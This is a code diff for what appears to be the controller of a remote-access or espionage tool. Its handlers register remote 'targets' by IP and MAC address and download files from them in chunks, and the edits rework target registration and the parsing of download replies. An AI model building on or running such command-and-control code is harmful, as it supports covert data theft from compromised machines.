@@ -241,7 +241,7 @@ int   TargetConnection::Handle_TAR(std::vector<std::string> & args)
 	ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
 	ULONG       osBuildNumber   = strtoul(args[3].c_str(), NULL, 10);
 	ULONG       lanId   = strtoul(args[4].c_str(), NULL, 10);
-	std::string comNameBase64 = args[5];
+	std::string comNameBase64 = GetStringFromWBase64(args[5].c_str());
 	ULONG       flag   = strtoul(args[6].c_str(), NULL, 10);
 	std::string macAddress = args[7];
 	std::string ip     = GetIPStrFromInt32(strtoul(args[8].c_str(), NULL, 10));
@@ -252,22 +252,25 @@ int   TargetConnection::Handle_TAR(std::vector<std::string> & args)
 		tar  = new Target();
 		ownerTarget = tar;
 		tar->dwProtocolVersion = 0;
-		tar->dwTargetID        = targetID;
+		tar->dwTargetID        = 10000; //targetID;
 		tar->dwGroupID         = flag ;
-		QString convert = QString("%1").arg(targetID);
-		tar->aniTargetName     = convert.toStdString();
+		//QString convert = QString("%1").arg(targetID);
+		tar->aniTargetName     = comNameBase64;
 
-		tar->widTargetName     = convert.toStdWString();
-		tar->dwOsBuildNumber   = osBuildNumber;
+		tar->widTargetName     = AnsiToWide(comNameBase64);
+		tar->dwOsBuildNumber   = OS_WIN2003; //osBuildNumber;
 		tar->aniRemMacAddr     = macAddress ;
 		tar->aniRemPublicIpAddr= ip;
 		tar->bIsMyTarget = true;
-		tar->dwLangId = 0;
+		tar->dwLangId = lanId;
 		SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
 
 		SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%d)",
 			targetID, ip.c_str(), flag);
 	}
+
+	tar->tarStatus = TARONLINE;
+	SendMessage(FrmMain->Handle, WM_TARGET_STATUS_CHANGE, (WPARAM)tar, NULL);
 
 	ownerTarget->tarConn = this;
 	ownerTarget->TargetDataConnOnline();
@@ -354,7 +357,7 @@ int  TargetConnection::Handle_FTK(std::vector<std::string> & args)
         {
             fileTask->taskDirect = FILEUP;
         }
-        fileTask->taskType = taskType;
+        fileTask->taskType = TASK_FILEDATA;
 
 		fileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
         fileTask->ctrPathW       = GetWideFromBase64(args[6].c_str());
@@ -367,6 +370,7 @@ int  TargetConnection::Handle_FTK(std::vector<std::string> & args)
         fileTask->dwLWLowDataTime  = 0;
         fileTask->dwLAHighDataTime = 0;
         fileTask->dwLALowDataTime  = 0;
+		fileTask->dwTotalLen = strtoul(args[8].c_str(),NULL,10);
 
         bNewFileTask = true;
     }
@@ -958,6 +962,7 @@ int  TargetConnection::Handle_FDT(std::vector<std::string> & args)
 		lpFileTask->dwTaskID    = taskID;
 		lpFileTask->taskDirect = FILEDOWN;
 		lpFileTask->taskType = TASK_FILEDATA;
+		lpFileTask->taskStatus = WORKING;
 
 		lpFileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
 		lpFileTask->ctrPathW       = L"..";
@@ -1323,19 +1328,11 @@ int   TargetConnection::Handle_FTS(std::vector<std::string> & args)
 int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 {
 	//  1   2   3   4        5         6           1      2
-	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATA DataLen\r\n
-	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATAFIN DataLen\r\n	
-	// TID PID DOW TASKID StartPos PATHBASE64\r\nERR ErrorCode\r\n	
+	// TID PID DOW TASKID StartPos PATHBASE64 DATA DataLen\r\n
+	// TID PID DOW TASKID StartPos PATHBASE64 DATAFIN DataLen\r\n	
+	// TID PID DOW TASKID StartPos PATHBASE64 ERR ErrorCode\r\n	
 
-	// 如果不足两行，下次再处理
-	if (false == IsWholeLineAvailable())
-	{
-		RecoverCommand();
-		return -1;
-	}
-
-	std::vector<std::string> args2 = SplitString(this->readBuffer.substr(0,this->readBuffer.find("\r\n")), " ");
-	std::string cmd = args2[0];
+	std::string cmd = args[6];
 
 	ULONG targetId = strtoul(args[0].c_str(),NULL,10);
 	assert(targetId == ownerTarget->dwTargetID);
@@ -1343,7 +1340,7 @@ int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 
 	if (cmd == "ERR")
 	{
-		ULONG lastErrCode = strtoul(args2[1].c_str(),NULL,10);
+		ULONG lastErrCode = strtoul(args[7].c_str(),NULL,10);
 
 		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加文件下载指令失败 - 下载文件\"%s\" [%s]",
 			tarBlock->widTargetName.c_str(),
@@ -1354,18 +1351,15 @@ int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 	else
 	{
 		std::string data;
-		int			dataLen = atoi(args2[1].c_str());
+		int			dataLen = atoi(args[7].c_str());
 		if (dataLen > 0)
 		{
-			if (false == IsWholeDataAvailable(dataLen + args2.size()))
+			if(!IsWholeDataAvailable(dataLen))
 			{
 				RecoverCommand();
 				return -1;
 			}
-
-			GetLine();
 			data = GetData(dataLen);
-
 		}
 
 		ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
@@ -1389,7 +1383,7 @@ int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 			return 0;
 		}
 
-		if ("DATAFIN" == args2[0])
+		if ("DATAFIN" == args[6])
 		{
 			// 关闭句柄
 			//
@@ -1397,7 +1391,12 @@ int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 			{
 				CloseHandle(fileTask->hFile);
 				fileTask->hFile = NULL;
+				tarBlock->FileTaskFinished(fileTask);
 			}     
+		}
+		else
+		{
+			Send_DOW(taskId, startPos+dataLen, args[5]);
 		}
 
 		// 更新界面
